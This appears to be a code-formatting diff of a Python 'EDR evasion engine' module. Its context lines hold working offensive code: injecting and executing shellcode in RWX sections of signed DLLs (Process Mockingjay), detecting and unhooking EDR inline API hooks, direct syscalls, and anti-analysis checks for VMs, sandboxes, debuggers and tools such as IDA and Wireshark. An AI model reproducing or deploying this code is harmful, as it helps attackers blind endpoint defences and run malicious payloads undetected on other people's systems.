@@ -14,21 +14,21 @@ Techniques implemented:
 - Environmental keying
 """
 
+import ctypes
+import logging
 import os
 import sys
-import logging
-import struct
-import ctypes
-from pathlib import Path
-from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass
 from enum import Enum
+from typing import Any, Dict, List, Optional
 
 # Platform-specific imports
 if sys.platform == "win32":
     import winreg
+
     try:
         import pefile
+
         PEFILE_AVAILABLE = True
     except ImportError:
         PEFILE_AVAILABLE = False
@@ -37,6 +37,7 @@ if sys.platform == "win32":
 
 class EvasionTechnique(Enum):
     """EDR evasion techniques"""
+
     PROCESS_MOCKINGJAY = "process_mockingjay"
     API_UNHOOKING = "api_unhooking"
     DIRECT_SYSCALL = "direct_syscall"
@@ -50,6 +51,7 @@ class EvasionTechnique(Enum):
 @dataclass
 class EDRHook:
     """Detected EDR hook information"""
+
     module: str
     function: str
     address: int
@@ -61,6 +63,7 @@ class EDRHook:
 @dataclass
 class RWXSection:
     """RWX memory section information"""
+
     dll_name: str
     dll_path: str
     section_name: str
@@ -72,6 +75,7 @@ class RWXSection:
 @dataclass
 class EvasionResult:
     """Result of evasion technique"""
+
     technique: EvasionTechnique
     success: bool
     details: Dict[str, Any]
@@ -132,16 +136,9 @@ class EDREvasionEngine:
 
         # Common locations to search
         search_paths = [
-            os.environ.get('WINDIR', 'C:\\Windows'),
-            os.environ.get('ProgramFiles', 'C:\\Program Files'),
-            os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'),
-        ]
-
-        # Known vulnerable DLLs (examples from research)
-        known_vulnerable = [
-            "msys-2.0.dll",  # Visual Studio component
-            "cygwin1.dll",
-            "Qt5Core.dll",
+            os.environ.get("WINDIR", "C:\\Windows"),
+            os.environ.get("ProgramFiles", "C:\\Program Files"),
+            os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"),
         ]
 
         self.logger.info("Scanning for RWX sections in loaded DLLs...")
@@ -153,7 +150,7 @@ class EDREvasionEngine:
             # Recursively search for DLLs
             for root, dirs, files in os.walk(search_path):
                 for file in files:
-                    if not file.lower().endswith('.dll'):
+                    if not file.lower().endswith(".dll"):
                         continue
 
                     dll_path = os.path.join(root, file)
@@ -181,16 +178,18 @@ class EDREvasionEngine:
                                 rwx_section = RWXSection(
                                     dll_name=file,
                                     dll_path=dll_path,
-                                    section_name=section.Name.decode('utf-8').rstrip('\x00'),
+                                    section_name=section.Name.decode("utf-8").rstrip("\x00"),
                                     base_address=section.VirtualAddress,
                                     size=section.Misc_VirtualSize,
-                                    signed=is_signed
+                                    signed=is_signed,
                                 )
 
                                 rwx_sections.append(rwx_section)
-                                self.logger.warning(f"Found RWX section: {file} - {rwx_section.section_name}")
+                                self.logger.warning(
+                                    f"Found RWX section: {file} - {rwx_section.section_name}"
+                                )
 
-                    except Exception as e:
+                    except Exception:
                         # Skip files that can't be parsed
                         continue
 
@@ -205,15 +204,15 @@ class EDREvasionEngine:
 
         try:
             import subprocess
+
             # Use PowerShell to check signature
-            cmd = f'powershell -Command "(Get-AuthenticodeSignature \'{file_path}\').Status -eq \'Valid\'"'
+            cmd = f"powershell -Command \"(Get-AuthenticodeSignature '{file_path}').Status -eq 'Valid'\""
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
             return "True" in result.stdout
-        except Exception as e:
+        except Exception:
             return False
 
-    def execute_in_rwx_section(self, rwx_section: RWXSection,
-                               shellcode: bytes) -> EvasionResult:
+    def execute_in_rwx_section(self, rwx_section: RWXSection, shellcode: bytes) -> EvasionResult:
         """
         Execute shellcode in an RWX section (Process Mockingjay technique).
 
@@ -235,10 +234,12 @@ class EDREvasionEngine:
                     technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                     success=False,
                     details={},
-                    error="Windows only"
+                    error="Windows only",
                 )
 
-            self.logger.info(f"Executing shellcode in {rwx_section.dll_name}:{rwx_section.section_name}")
+            self.logger.info(
+                f"Executing shellcode in {rwx_section.dll_name}:{rwx_section.section_name}"
+            )
 
             # Step 1: Load the DLL
             kernel32 = ctypes.windll.kernel32
@@ -249,7 +250,7 @@ class EDREvasionEngine:
                     technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                     success=False,
                     details={},
-                    error="Failed to load DLL"
+                    error="Failed to load DLL",
                 )
 
             # Step 2: Calculate target address
@@ -265,7 +266,7 @@ class EDREvasionEngine:
                 ctypes.c_void_p(target_address),
                 shellcode,
                 len(shellcode),
-                ctypes.byref(written)
+                ctypes.byref(written),
             )
 
             if not success:
@@ -273,19 +274,14 @@ class EDREvasionEngine:
                     technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                     success=False,
                     details={},
-                    error="Failed to write shellcode"
+                    error="Failed to write shellcode",
                 )
 
             # Step 4: Execute
             # Create thread at shellcode location
             thread_id = ctypes.c_ulong(0)
             thread_handle = kernel32.CreateThread(
-                None,
-                0,
-                ctypes.c_void_p(target_address),
-                None,
-                0,
-                ctypes.byref(thread_id)
+                None, 0, ctypes.c_void_p(target_address), None, 0, ctypes.byref(thread_id)
             )
 
             if not thread_handle:
@@ -293,7 +289,7 @@ class EDREvasionEngine:
                     technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                     success=False,
                     details={},
-                    error="Failed to create thread"
+                    error="Failed to create thread",
                 )
 
             self.logger.info(f"Shellcode executing in thread {thread_id.value}")
@@ -302,11 +298,11 @@ class EDREvasionEngine:
                 technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                 success=True,
                 details={
-                    'dll': rwx_section.dll_name,
-                    'section': rwx_section.section_name,
-                    'address': hex(target_address),
-                    'thread_id': thread_id.value
-                }
+                    "dll": rwx_section.dll_name,
+                    "section": rwx_section.section_name,
+                    "address": hex(target_address),
+                    "thread_id": thread_id.value,
+                },
             )
 
         except Exception as e:
@@ -314,7 +310,7 @@ class EDREvasionEngine:
                 technique=EvasionTechnique.PROCESS_MOCKINGJAY,
                 success=False,
                 details={},
-                error=str(e)
+                error=str(e),
             )
 
     # ========== API UNHOOKING ==========
@@ -368,11 +364,11 @@ class EDREvasionEngine:
                 return hooks
 
             pe = pefile.PE(module_path, fast_load=True)
-            pe.parse_data_directories(directories=[
-                pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']
-            ])
+            pe.parse_data_directories(
+                directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
+            )
 
-            if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
+            if not hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
                 return hooks
 
             # Check each exported function
@@ -380,7 +376,7 @@ class EDREvasionEngine:
                 if not export.name:
                     continue
 
-                func_name = export.name.decode('utf-8')
+                func_name = export.name.decode("utf-8")
                 func_rva = export.address
 
                 # Read in-memory bytes
@@ -398,7 +394,7 @@ class EDREvasionEngine:
                         address=func_address,
                         hook_type="inline",
                         original_bytes=disk_bytes[:16],
-                        patched_bytes=memory_bytes
+                        patched_bytes=memory_bytes,
                     )
                     hooks.append(hook)
                     self.logger.warning(f"Hook detected: {module_name}!{func_name}")
@@ -411,10 +407,10 @@ class EDREvasionEngine:
     def _get_module_path(self, module_name: str) -> Optional[str]:
         """Get full path to a loaded module"""
         if sys.platform == "win32":
-            system_dir = os.environ.get('SystemRoot', 'C:\\Windows')
+            system_dir = os.environ.get("SystemRoot", "C:\\Windows")
             paths = [
-                os.path.join(system_dir, 'System32', module_name),
-                os.path.join(system_dir, 'SysWOW64', module_name),
+                os.path.join(system_dir, "System32", module_name),
+                os.path.join(system_dir, "SysWOW64", module_name),
             ]
             for path in paths:
                 if os.path.exists(path):
@@ -427,15 +423,11 @@ class EDREvasionEngine:
             buffer = (ctypes.c_char * size)()
             kernel32 = ctypes.windll.kernel32
             kernel32.ReadProcessMemory(
-                kernel32.GetCurrentProcess(),
-                ctypes.c_void_p(address),
-                buffer,
-                size,
-                None
+                kernel32.GetCurrentProcess(), ctypes.c_void_p(address), buffer, size, None
             )
             return bytes(buffer)
-        except:
-            return b''
+        except Exception:
+            return b""
 
     def unhook_api(self, hook: EDRHook) -> bool:
         """
@@ -459,7 +451,7 @@ class EDREvasionEngine:
                 ctypes.c_void_p(hook.address),
                 len(hook.original_bytes),
                 0x40,  # PAGE_EXECUTE_READWRITE
-                ctypes.byref(old_protect)
+                ctypes.byref(old_protect),
             )
 
             if not success:
@@ -467,9 +459,7 @@ class EDREvasionEngine:
 
             # Write original bytes
             ctypes.memmove(
-                ctypes.c_void_p(hook.address),
-                hook.original_bytes,
-                len(hook.original_bytes)
+                ctypes.c_void_p(hook.address), hook.original_bytes, len(hook.original_bytes)
             )
 
             # Restore protection
@@ -477,7 +467,7 @@ class EDREvasionEngine:
                 ctypes.c_void_p(hook.address),
                 len(hook.original_bytes),
                 old_protect.value,
-                ctypes.byref(old_protect)
+                ctypes.byref(old_protect),
             )
 
             self.logger.info(f"Unhooked: {hook.module}!{hook.function}")
@@ -504,8 +494,7 @@ class EDREvasionEngine:
 
     # ========== DIRECT SYSCALLS ==========
 
-    def execute_direct_syscall(self, syscall_number: int,
-                               args: List[int]) -> int:
+    def execute_direct_syscall(self, syscall_number: int, args: List[int]) -> int:
         """
         Execute a direct syscall, bypassing userland hooks entirely.
 
@@ -553,20 +542,22 @@ class EDREvasionEngine:
             Dictionary of detection results
         """
         results = {
-            'is_vm': self._check_virtual_machine(),
-            'is_sandbox': self._check_sandbox(),
-            'is_debugged': self._check_debugger(),
-            'analysis_tools': self._check_analysis_tools(),
-            'suspicious_hardware': self._check_suspicious_hardware(),
+            "is_vm": self._check_virtual_machine(),
+            "is_sandbox": self._check_sandbox(),
+            "is_debugged": self._check_debugger(),
+            "analysis_tools": self._check_analysis_tools(),
+            "suspicious_hardware": self._check_suspicious_hardware(),
         }
 
-        results['is_analysis_env'] = any([
-            results['is_vm'],
-            results['is_sandbox'],
-            results['is_debugged'],
-            bool(results['analysis_tools']),
-            bool(results['suspicious_hardware'])
-        ])
+        results["is_analysis_env"] = any(
+            [
+                results["is_vm"],
+                results["is_sandbox"],
+                results["is_debugged"],
+                bool(results["analysis_tools"]),
+                bool(results["suspicious_hardware"]),
+            ]
+        )
 
         return results
 
@@ -586,7 +577,7 @@ class EDREvasionEngine:
                 try:
                     winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                     indicators.append(f"Registry: {key_path}")
-                except:
+                except OSError:
                     pass
 
         return len(indicators) > 0
@@ -597,22 +588,29 @@ class EDREvasionEngine:
 
         # Check for common sandbox hostnames
         sandbox_hostnames = [
-            'sandbox', 'malware', 'virus', 'sample',
-            'cuckoo', 'analysis', 'vmware', 'vbox'
+            "sandbox",
+            "malware",
+            "virus",
+            "sample",
+            "cuckoo",
+            "analysis",
+            "vmware",
+            "vbox",
         ]
 
-        hostname = os.environ.get('COMPUTERNAME', '').lower()
+        hostname = os.environ.get("COMPUTERNAME", "").lower()
         if any(name in hostname for name in sandbox_hostnames):
             indicators.append(f"Hostname: {hostname}")
 
         # Check for insufficient resources (common in sandboxes)
         try:
             import psutil
+
             if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                 indicators.append("Low memory")
             if psutil.cpu_count() < 2:
                 indicators.append("Low CPU count")
-        except:
+        except Exception:
             pass
 
         return len(indicators) > 0
@@ -629,8 +627,7 @@ class EDREvasionEngine:
             # CheckRemoteDebuggerPresent
             debugger_present = ctypes.c_bool()
             kernel32.CheckRemoteDebuggerPresent(
-                kernel32.GetCurrentProcess(),
-                ctypes.byref(debugger_present)
+                kernel32.GetCurrentProcess(), ctypes.byref(debugger_present)
             )
             if debugger_present.value:
                 return True
@@ -640,24 +637,30 @@ class EDREvasionEngine:
     def _check_analysis_tools(self) -> List[str]:
         """Check for running analysis tools"""
         analysis_tools = [
-            'idaq64.exe', 'idaq.exe', 'idaw.exe',
-            'x64dbg.exe', 'x32dbg.exe',
-            'ollydbg.exe',
-            'windbg.exe',
-            'ghidra.exe',
-            'processhacker.exe',
-            'procmon.exe', 'procexp.exe',
-            'wireshark.exe', 'fiddler.exe',
+            "idaq64.exe",
+            "idaq.exe",
+            "idaw.exe",
+            "x64dbg.exe",
+            "x32dbg.exe",
+            "ollydbg.exe",
+            "windbg.exe",
+            "ghidra.exe",
+            "processhacker.exe",
+            "procmon.exe",
+            "procexp.exe",
+            "wireshark.exe",
+            "fiddler.exe",
         ]
 
         found_tools = []
 
         try:
             import psutil
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'].lower() in analysis_tools:
-                    found_tools.append(proc.info['name'])
-        except:
+
+            for proc in psutil.process_iter(["name"]):
+                if proc.info["name"].lower() in analysis_tools:
+                    found_tools.append(proc.info["name"])
+        except Exception:
             pass
 
         return found_tools
@@ -665,13 +668,6 @@ class EDREvasionEngine:
     def _check_suspicious_hardware(self) -> List[str]:
         """Check for suspicious hardware (VMs, sandboxes)"""
         suspicious = []
-
-        # Common VM GPUs
-        evil_gpus = [
-            'ASPEED Graphics',
-            'VirtualBox Graphics',
-            'VMware SVGA',
-        ]
 
         # In real implementation, would enumerate graphics adapters
         # For now, placeholder
